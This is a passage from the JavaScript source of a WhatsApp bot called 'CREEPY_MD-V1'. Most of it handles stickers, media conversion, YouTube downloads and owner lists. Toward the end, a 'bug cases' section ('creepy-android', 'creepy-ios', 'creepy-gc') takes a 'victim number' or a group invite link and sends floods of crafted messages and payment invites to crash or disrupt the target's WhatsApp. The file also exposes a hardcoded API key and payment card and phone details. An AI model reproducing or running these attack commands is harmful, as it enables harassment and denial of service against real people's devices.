                    text: '*You can pay via visa*\n*4403530021231999*\n*Also if you are from east Africa you can use pohone number*\nAirtel number\n*255697608274*\n*Name:Abraham laizer*\n`Airtel moey`\n*Vodacom number*\n*255768788833*\n*Name:Janeth Ibrahim*\n`M-pesa`\n*Thank you and keep using 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏*\n' + textnate
                }, {
                    quoted: m
                })
                break
            case 'owner':
            case 'Danny': {
                const repf = await DannyTechInc.sendMessage(from, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }, mentions: [sender]
                }, { quoted: m })
                DannyTechInc.sendMessage(from, { text: `𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏\n> Hello @${sender.split("@")[0]}, 🙄That is 𝓒𝓡𝓔𝓔𝓟𝓨_𝓜𝓓-𝓥𝟏 owner`, mentions: [sender] }, { quoted: repf })
            }
                break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyglobal(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await DannyTechInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyglobal('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await DannyTechInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyglobal(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
                break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replyglobal(respond)
                if (!text) return replyglobal(respond)
                replyglobal(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await DannyTechInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await DannyTechInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
                break
            case 'swm': case 'steal': case 'stickerwm': case 'take': {
                if (!args.join(" ")) return replyglobal(`Where is the text?`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0]
                const atnm = swn.split("|")[1]
                if (m.quoted.isAnimated === true) {
                    DannyTechInc.downloadAndSaveMediaMessage(quoted, "gifee")
                    DannyTechInc.sendMessage(from, { sticker: fs.readFileSync("gifee.webp") }, { quoted: m })
                } else if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await DannyTechInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyglobal('Maximum 10 Seconds!')
                    let media = await quoted.download()
                    let encmedia = await DannyTechInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
                } else {
                    replyglobal(`Photo/Video?`)
                }
            }
                break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replyglobal(`Reply sticker with caption *${prefix + command}*`)
                replyglobal(mess.wait)
                let media = await DannyTechInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    DannyTechInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
                break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replyglobal(`Reply sticker with caption *${prefix + command}*`)
                replyglobal(mess.wait)
                let media = await DannyTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await DannyTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
                break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyglobal(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replyglobal(mess.wait)
                let media = await DannyTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                DannyTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
                break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyglobal(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replyglobal(mess.wait)
                let media = await DannyTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                DannyTechInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `creepy.mp3`
                }, {
                    quoted: m
                })

            }
                break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyglobal(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replyglobal(mess.wait)
                let media = await DannyTechInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                DannyTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
                break
            case 'togif': {
                if (!/webp/.test(mime)) return replyglobal(`Reply sticker with caption *${prefix + command}*`)
                replyglobal(mess.wait)
                let media = await DannyTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await DannyTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
                break
            case 'tourl': {
                replyglobal(mess.wait)
                let media = await DannyTechInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replyglobal(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replyglobal(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
                break
            case 'emojimix':
            case 'mix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replyglobal(`Example : ${prefix + command} 😀+😂`)
                if (!emoji2) return replyglobal(`Example : ${prefix + command} 😀+😂`)
                replyglobal(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await DannyTechInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
                break
            case 'tovv':
            case 'toviewonce': {
                if (!quoted) return replyglobal(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await DannyTechInc.downloadAndSaveMediaMessage(quoted)
                    DannyTechInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `*Here you go!*`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await DannyTechInc.downloadAndSaveMediaMessage(quoted)
                    DannyTechInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `*Here you go!*`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
                break
            case 'toqr': {
                if (!q) return replyglobal(' Plelinkgive me link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await DannyTechInc.sendMessage(from, {
                    image: medi,
                    caption: "*Here you go!*"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
                break
            case 'fliptext': {
                if (args.length < 1) return replyglobal(`Example:\n${prefix}fliptext Creepy`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replyglobal(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
                break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNotecreep) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNotecreep.length}*`
                replyglobal(teks)
            }
                break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of Stickercreep) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Stickercreep.length}*`
                replyglobal(teks)
            }
                break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of Imagecreep) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Imagecreep.length}*`
                replyglobal(teks)
            }
                break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of Videocreep) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Videocreep.length}*`
                replyglobal(teks)
            }
                break
            case 'addowner':
            case 'newowner':
                if (!isCreator) return replyglobal(mess.owner)
                if (!args[0]) return replyglobal(`Use ${prefix + command} number\nExample ${prefix + command} ${ownernumber}`)
                bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
                let ceknye = await DannyTechInc.onWhatsApp(bnnd)
                if (ceknye.length == 0) return replyglobal(`Enter A Valid And Registered Number On WhatsApp!!!`)
                owner.push(bnnd)
                fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
                replyglobal(`Congratulations ${bnnd} ${pushname} Has Become An Owner!!!`)
                break
            case 'delowner':
                if (!isCreator) return replyglobal(mess.owner)
                if (!args[0]) return replyglobal(`Use ${prefix + command} nomor\nExample ${prefix + command} 255697608274`)
                ya = q.split("|")[0].replace(/[^0-9]/g, '')
                unp = owner.indexOf(ya)
                owner.splice(unp, 1)
                fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
                replyglobal(`This user  ${ya} ${pushname} is no longer an owner!!!`)
                break
            case 'addvideo': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Video Name?')
                if (Videocreep.includes(q)) return replyglobal("The name you entered already exists")
                let delb = await DannyTechInc.downloadAndSaveMediaMessage(quoted)
                Videocreep.push(q)
                await fsx.copy(delb, `./GlobalMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(Videocreep))
                fs.unlinkSync(delb)
                replyglobal(`Success Adding Video \nTo View Type ${prefix}listvideo`)
            }
                break
            case 'delvideo': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the Video Name')
                if (!Videocreep.includes(q)) return replyglobal("Name Does Not Exist in Database")
                let wanu = Videocreep.indexOf(q)
                Videocreep.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(Videocreep))
                fs.unlinkSync(`./GlobalMedia/video/${q}.mp4`)
                replyglobal(`Successfully Deleted Video ${q}`)
            }
                break
            case 'addimage': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('The name of the image?')
                if (Imagecreep.includes(q)) return replyglobal("The name you entered is already registered in the database")
                let delb = await DannyTechInc.downloadAndSaveMediaMessage(quoted)
                Imagecreep.push(q)
                await fsx.copy(delb, `./GlobalMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(Imagecreep))
                fs.unlinkSync(delb)
                replyglobal(`Bot Creepy added Image\nTo Check Type ${prefix}listimage`)
            }
                break
            case 'delimage': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the Image Name')
                if (!Imagecreep.includes(q)) return replyglobal("The image name you entered is not registered")
                let wanu = Imagecreep.indexOf(q)
                Imagecreep.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(Imagecreep))
                fs.unlinkSync(`./GlobalMedia/image/${q}.jpg`)
                replyglobal(`Bot Creepy Deleted Image ${q}`)
            }
                break
            case 'addsticker': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the name of the sticker?')
                if (Stickercreep.includes(q)) return replyglobal("Name Already In Use")
                let delb = await DannyTechInc.downloadAndSaveMediaMessage(quoted)
                Stickercreep.push(q)
                await fsx.copy(delb, `./GlobalMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(Stickercreep))
                fs.unlinkSync(delb)
                replyglobal(`Successfully Adding Sticker\nTo Check Type ${prefix}liststicker`)
            }
                break
            case 'delsticker': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the name of the sticker')
                if (!Stickercreep.includes(q)) return replyglobal("Name Not Registered in Database")
                let wanu = Stickercreep.indexOf(q)
                StickerDannyTechInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(Stickercreep))
                fs.unlinkSync(`./GlobalMedia/sticker/${q}.webp`)
                replyglobal(`Bot Creepy Removed Sticker ${q}`)
            }
                break
            case 'addvn': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the Name?')
                if (VoiceNotecreep.includes(q)) return replyglobal("Name Already In Use")
                let delb = await DannyTechInc.downloadAndSaveMediaMessage(quoted)
                VoiceNotecreep.push(q)
                await fsx.copy(delb, `./GlobalMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNotecreep))
                fs.unlinkSync(delb)
                replyglobal(`Bot Creepy Added Audio\nTo Check Type ${prefix}listvn`)
            }
                break
            case 'delvn': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the Name')
                if (!VoiceNotecreep.includes(q)) return replyglobal("Name Not Registered in Database")
                let wanu = VoiceNotecreep.indexOf(q)
                VoiceNotecreep.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNotecreep))
                fs.unlinkSync(`./GlobalMedia/audio/${q}.mp3`)
                replyglobal(`Bot Creepy Deleted Audio ${q}`)
            }
                break
            case 'addzip': {
                if (!isPremium) return replyglobal(mess.prem)
                await loading()
                if (args.length < 1) return replyglobal(`What's the zip name?`)
                let teks = `${text}`
                {
                    if (Zipcreep.includes(teks)) return replyglobal("This name is already in use")
                    let delb = await DannyTechInc.downloadAndSaveMediaMessage(quoted)
                    Zipcreep.push(teks)
                    await fsx.copy(delb, `./GlobalMedia/zip/${teks}.zip`)
                    fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(Zipcreep))
                    fs.unlinkSync(delb)
                    replyglobal(`Bot Creepy Added zip\nTo check type ${prefix}listzip`)
                }
            }
                break
            case 'delzip': {
                if (!isPremium) return replyglobal(mess.prem)
                await loading()
                if (args.length < 1) return replyglobal('Enter the text in the zip list')
                let teks = `${text}`
                {
                    if (!Zipcreep.includes(teks)) return replyglobal("This name does not exist in the database")
                    let wanu = Zipcreep.indexOf(teks)
                    Zipcreep.splice(wanu, 1)
                    fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(Zipcreep))
                    fs.unlinkSync(`./GlobalMedia/zip/${teks}.zip`)
                    replyglobal(`Successfully deleted zip ${teks}`)
                }
            }
                break
            case 'listzip': {
                await loading()
                let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
                for (let x of Zipcreep) {
                    teksooooo += `│⭔ ${x}\n`
                }
                teksooooo += `│\n└────────────⭓\n\n*Total : ${Zipcreep.length}*`
                replyglobal(teksooooo)
            }
                break
            case 'addapk': {
                if (!isPremium) return replyglobal(mess.prem)
                await loading()
                if (args.length < 1) return replyglobal('What is the name of the apk?')
                let teks = `${text}`
                {
                    if (Apkcreep.includes(teks)) return replyglobal("This name is already in use")
                    let delb = await DannyTechInc.downloadAndSaveMediaMessage(quoted)
                    apknye.push(teks)
                    await fsx.copy(delb, `./GlobalMedia/apk/${teks}.apk`)
                    fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(Apkcreep))
                    fs.unlinkSync(delb)
                    replyglobal(`Bot Creepy Added the apk\nTo Check type ${prefix}listapk`)
                }
            }
                break
            case 'delapk': {
                if (!isPremium) return replyglobal(mess.prem)
                await loading()
                if (args.length < 1) return replyglobal('Name of the apk?')
                let teks = `${text}`
                {
                    if (!Apkcreep.includes(teks)) return replyglobal("This name does not exist in the database")
                    let wanu = Apkcreep.indexOf(teks)
                    Apkcreep.splice(wanu, 1)
                    fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(Apkcreep))
                    fs.unlinkSync(`./GlobalMedia/apk/${teks}.apk`)
                    replyglobal(`Bot Creepy deleted Apk ${teks}`)
                }
            }
                break
            case 'listapk': {
                await loading()
                let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
                for (let x of Apkcreep) {
                    teksoooooo += `│⭔ ${x}\n`
                }
                teksoooooo += `│\n└────────────⭓\n\n*Total : ${Apkcreep.length}`
                replyglobal(teksoooooo)
            }
                break
            case 'addpdf': {
                if (!isPremium) return replyglobal(mess.prem)
                await loading()
                if (args.length < 1) return replyglobal('What is the name of the pdf')
                let teks = `${text}`
                {
                    if (Doccreep.includes(teks)) return replyglobal("This name is already in use")
                    let delb = await DannyTechInc.downloadAndSaveMediaMessage(quoted)
                    docunye.push(teks)
                    await fsx.copy(delb, `./GlobalMedia/doc/${teks}.pdf`)
                    fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(Doccreep))
                    fs.unlinkSync(delb)
                    replyglobal(`Bot Creepy Added Pdf\nTo check type ${prefix}listpdf`)
                }
            }
                break
            case 'delpdf': {
                if (!isPremium) return replyglobal(mess.prem)
                await loading()
                if (args.length < 1) return replyglobal('Enter the name')
                let teks = `${text}`
                {
                    if (!Doccreep.includes(teks)) return replyglobal("This name does not exist in the database")
                    let wanu = DocApk.indexOf(teks)
                    docunye.splice(wanu, 1)
                    fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(Doccreep))
                    fs.unlinkSync(`./GlobalMedia/doc/${teks}.pdf`)
                    replyglobal(`Bot Creepy deleted pdf ${teks}`)
                }
            }
                break
            case 'listpdf': {
                await loading()
                let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
                for (let x of docunye) {
                    teksoooo += `│⭔ ${x}\n`
                }
                teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
                replyglobal(teksoooo)
            }
                break
            case 'afk':
                if (!m.isGroup) return replyglobal(mess.group)
                if (isAfkOn) return replyglobal("Already notag")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replyglobal(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
            case 'play': case 'song': {
                if (!text) return replyglobal(`Example : ${prefix + command} anime whatsapp status`)
                const creepplaymp3 = require('./lib/ytdl2')
                let yts = require("youtube-yts")
                let search = await yts(text)
                let anup3k = search.videos[0]
                const pl = await creepplaymp3.mp3(anup3k.url)
                await DannyTechInc.sendMessage(m.chat, {
                    audio: fs.readFileSync(pl.path),
                    fileName: anup3k.title + '.mp3',
                    mimetype: 'audio/mp4', ptt: true,
                    contextInfo: {
                        externalAdReply: {
                            title: anup3k.title,
                            body: botname,
                            thumbnail: await fetchBuffer(pl.meta.image),
                            mediaType: 2,
                            mediaUrl: anup3k.url,
                        }

                    },
                }, { quoted: m })
                await fs.unlinkSync(pl.path)
            }
                break
            case "ytmp3": case "ytaudio":
                const creepaudp3 = require('./lib/ytdl2')
                if (args.length < 1 || !isUrl(text) || !creepaudp3.isYTUrl(text)) return replyglobal(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
                const audio = await creepaudp3.mp3(text)
                await DannyTechInc.sendMessage(m.chat, {
                    audio: fs.readFileSync(audio.path),
                    mimetype: 'audio/mp4', ptt: true,
                    contextInfo: {
                        externalAdReply: {
                            title: audio.meta.title,
                            body: botname,
                            thumbnail: await fetchBuffer(audio.meta.image),
                            mediaType: 2,
                            mediaUrl: text,
                        }
                    },
                }, { quoted: m })
                await fs.unlinkSync(audio.path)
                break
            case 'ytmp4': case 'ytvideo': {
                const creepvidoh = require('./lib/ytdl2')
                if (args.length < 1 || !isUrl(text) || !creepvidoh.isYTUrl(text)) replyglobal(`Where is the link??\n\nExample : ${prefix + command} https://youtu.be/HBUWUVVRzf4?si=4CvKunyL6Wm0Qwm1`)
                const vid = await creepvidoh.mp4(text)
                const ytc = `
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
                await DannyTechInc.sendMessage(m.chat, {
                    video: { url: vid.videoUrl },
                    caption: ytc
                }, { quoted: m })
            }
                break
            case 'sound1':
            case 'sound2':
            case 'sound3':
            case 'sound4':
            case 'sound5':
            case 'sound6':
            case 'sound7':
            case 'sound8':
            case 'sound9':
            case 'sound10':
            case 'sound11':
            case 'sound12':
            case 'sound13':
            case 'sound14':
            case 'sound15':
            case 'sound16':
            case 'sound17':
            case 'sound18':
            case 'sound19':
            case 'sound20':
            case 'sound21':
            case 'sound22':
            case 'sound23':
            case 'sound24':
            case 'sound25':
            case 'sound26':
            case 'sound27':
            case 'sound28':
            case 'sound29':
            case 'sound30':
            case 'sound31':
            case 'sound32':
            case 'sound33':
            case 'sound34':
            case 'sound35':
            case 'sound36':
            case 'sound37':
            case 'sound38':
            case 'sound39':
            case 'sound40':
            case 'sound41':
            case 'sound42':
            case 'sound43':
            case 'sound44':
            case 'sound45':
            case 'sound46':
            case 'sound47':
            case 'sound48':
            case 'sound49':
            case 'sound50':
            case 'sound51':
            case 'sound52':
            case 'sound53':
            case 'sound54':
            case 'sound55':
            case 'sound56':
            case 'sound57':
            case 'sound58':
            case 'sound59':
            case 'sound60':
            case 'sound61':
            case 'sound62':
            case 'sound63':
            case 'sound64':
            case 'sound65':
            case 'sound66':
            case 'sound67':
            case 'sound68':
            case 'sound69':
            case 'sound70':
            case 'sound71':
            case 'sound72':
            case 'sound73':
            case 'sound74':
            case 'sound75':
            case 'sound76':
            case 'sound77':
            case 'sound78':
            case 'sound79':
            case 'sound80':
            case 'sound81':
            case 'sound82':
            case 'sound83':
            case 'sound84':
            case 'sound85':
            case 'sound86':
            case 'sound87':
            case 'sound88':
            case 'sound89':
            case 'sound90':
            case 'sound91':
            case 'sound92':
            case 'sound93':
            case 'sound94':
            case 'sound95':
            case 'sound96':
            case 'sound97':
            case 'sound98':
            case 'sound99':
            case 'sound100':
            case 'sound101':
            case 'sound102':
            case 'sound103':
            case 'sound104':
            case 'sound105':
            case 'sound106':
            case 'sound107':
            case 'sound108':
            case 'sound109':
            case 'sound110':
            case 'sound111':
            case 'sound112':
            case 'sound113':
            case 'sound114':
            case 'sound115':
            case 'sound116':
            case 'sound117':
            case 'sound118':
            case 'sound119':
            case 'sound120':
            case 'sound121':
            case 'sound122':
            case 'sound123':
            case 'sound124':
            case 'sound125':
            case 'sound126':
            case 'sound127':
            case 'sound128':
            case 'sound129':
            case 'sound130':
            case 'sound131':
            case 'sound132':
            case 'sound133':
            case 'sound134':
            case 'sound135':
            case 'sound136':
            case 'sound137':
            case 'sound138':
            case 'sound139':
            case 'sound140':
            case 'sound141':
            case 'sound142':
            case 'sound143':
            case 'sound144':
            case 'sound145':
            case 'sound146':
            case 'sound147':
            case 'sound148':
            case 'sound149':
            case 'sound150':
            case 'sound151':
            case 'sound152':
            case 'sound153':
            case 'sound154':
            case 'sound155':
            case 'sound156':
            case 'sound157':
            case 'sound158':
            case 'sound159':
            case 'sound160':
            case 'sound161':
                DannyTechInc_dev = await getBuffer(`https://github.com/DGcreep/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
                await DannyTechInc.sendMessage(m.chat, { audio: DannyTechInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                break

            //bug cases (beta)
            case "creepy-android": {
                if (!isPremium) return replyglobal(mess.prem)
                if (!text) return replyglobal(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 2557xxxxxxxxxx,5`)
                let number = text.split(',')[0];
                let amount = text.split(',')[1] * 5;
                if (!number || !amount) {
                    return replyglobal(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 2557xxxxxxxxxx,5`)
                }
                if (isNaN(parseInt(amount))) {
                    return replyglobal("Amount must be a number");
                }
                let cleanedNumber = number.replace(/[^0-9]/g, '');
                let encodedAmount = '' + encodeURI(amount);
                var contactInfo = await DannyTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
                if (cleanedNumber == "923444844060") {
                    return;
                }
                if (contactInfo.length == 0) {
                    return replyglobal("The number is not registered on WhatsApp");
                }
                replyglobal("please wait, " + command + " bug is in process..");
                await sleep(2000); // Adjusted sleep time for clarity
                sendVariousMessages(whatsappNumber, encodedAmount);
                await sleep(2500); // Adjusted sleep time for clarity
                sendMessageWithMentions(
                    "Bot Creepy Sent Bug To @" + whatsappNumber.split('@')[0] +
                    " Using *" + command + "* 😂\n\nPause 2 minutes so that creepy won't stop on your panel.",
                    [whatsappNumber]
                );
            }
                break;
            case "creepy-ios": {
                if (!isPremium) return replyglobal(mess.prem)
                if (!text) return replyglobal(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 2557xxxxxxxxxx,5`)
                let number = text.split(',')[0];
                let amount = text.split(',')[1] * 5;
                if (!number || !amount) {
                    return replyglobal(`Use ${prefix + command} victim number|amount\nExample ${prefix + command} 2557xxxxxxxxxx,5`)
                }
                if (isNaN(parseInt(amount))) {
                    return replyglobal("Amount must be a number");
                }
                let cleanedNumber = number.replace(/[^0-9]/g, '');
                let encodedAmount = '' + encodeURI(amount);
                var contactInfo = await DannyTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
                if (cleanedNumber == "923444844060") {
                    return;
                }
                if (contactInfo.length == 0) {
                    return replyglobal("The number is not registered on WhatsApp");
                }
                replyglobal("please wait, " + command + " bug is in process..");
                await sleep(2000); // Adjusted sleep time for clarity
                sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
                await sleep(2500); // Adjusted sleep time for clarity
                sendMessageWithMentions(
                    "Bot Creepy Sent Bug To @" + whatsappNumber.split('@')[0] +
                    " Using *" + command + "* ✅\n\nPause 2 minutes so that Creepy won't stop on your panel.",
                    [whatsappNumber]
                );
            }
                break;
            case "creepy-ios2":
                {
                    if (!isPremium) return replyglobal(mess.prem)
                    if (!isBot) {
                        return replyglobal("*This feature is for the creepy only!*");
                    }
                    if (!text) {
                        return replyglobal(`Example usage: ${prefix + command} 5`)
                    }
                    if (isNaN(parseInt(text))) {
                        return replyglobal("Amount must be a number");
                    }
                    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
                    replyglobal("please wait, " + command + "  is in process..");
                    await sleep(1500); // Adjusted sleep time for clarity
                    sendMultiplePaymentInvites(from, encodedValue);
                    await sleep(2500); // Adjusted sleep time for clarity
                    sendReaction('✅');
                }
                break;
            case "creepy-android2":
                {
                    if (!isPremium) return replyglobal(mess.prem)
                    if (!isBot) {
                        return replyglobal("*This feature is for the creepy only!*");
                    }
                    if (!text) {
                        return replyglobal(`Example usage: ${prefix + command} 5`)
                    }
                    if (isNaN(parseInt(text))) {
                        return replyglobal("Amount must be a number");
                    }
                    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
                    replyglobal("please wait, " + command + " bug is in process..");
                    await sleep(1500); // Adjusted sleep time for clarity
                    sendVariousMessages(from, encodedValue);
                    await sleep(2500); // Adjusted sleep time for clarity
                    sendReaction('✅');
                }
                break;
            case "creepy-gc":
            case "creepy-bug-group":
                {
                    if (!isPremium) return replyglobal(mess.prem)
                    if (!text) {
                        return replyglobal("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nExample: ." + command + " creepy-gc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
                    }
                    replyglobal("please wait, " + command + "  bug is in process..");
                    if (!text.split(" ")[0].includes("whatsapp.com")) {
                        return replyglobal("Link Invalid!");
                    }
                    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
                    try {
                        let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
                        let groupTarget = await DannyTechInc.groupAcceptInvite(groupLink);
                        await sleep(2000); // Adjusted sleep time for clarity
                        sendViewOnceMessages(groupTarget, bugAmount);
                        await sleep(2500); // Adjusted sleep time for clarity
